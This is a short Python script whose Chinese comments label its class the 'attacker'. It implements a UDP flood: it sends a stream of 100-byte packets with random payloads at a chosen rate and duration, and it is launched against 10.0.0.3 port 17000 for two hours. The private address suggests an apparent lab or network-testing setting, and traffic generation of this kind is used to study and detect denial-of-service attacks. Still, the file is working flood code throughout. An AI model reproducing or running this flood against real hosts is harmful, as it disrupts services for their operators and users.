# coding=utf-8
from math import ceil
from random import randint
from socket import *
from time import time, sleep
from threading import Thread


class UDP:
    'UDP连接（攻击者）'

    def __init__(self, des_host, des_port, rate, last):
        # 初始化地址（主机+端口号），UDP速率(Mbit/s=1024*1024bit/s),持续时间
        self.des_host = des_host
        self.des_port = des_port
        self.rate = rate
        self.last = last

    def get_random_data(self):
        # UTF-8中，一个英文字母占用1字节
        string = 'QAZXSWEDCVFRTGBNHYUJMKIOLPqwertyuiopasdfghjklzxcvbnm1234567890`-=[];,./'
        data = string[0:randint(1, len(string) - 1)]
        return data

    def create_udp_link(self):
        # 创建socket对象,SOCK_DGRAM为数据报/UDP套接字
        print('udp start')
        udp_attacker = socket(AF_INET, SOCK_DGRAM)
        # 绑定地址
        # udp_attacker.bind((self.src_host, self.src_port))
        # 设定UDP包大小为100字节=100*8bit，其中头部占8字节=8*8bit,计算每s所需发送包数量
        bag_num = int(ceil(self.rate * 1024 * 1024 / (100 * 8)))
        start_time = time()
        while time() - start_time <= self.last:
            for i in range(bag_num):
                # 处理阶段,向地址（host,port）发起攻击
                string = self.get_random_data()
                data = string + '+' * (100 - 8 - len(string))
                udp_attacker.sendto(data.encode(), (self.des_host, self.des_port))
                sleep(1 / bag_num)
        # 连接结束，关闭套接字
        print('udp finish')
        udp_attacker.close()


udp = UDP('10.0.0.3', 17000, 1, 2 * 60 * 60)
udp.create_udp_link()
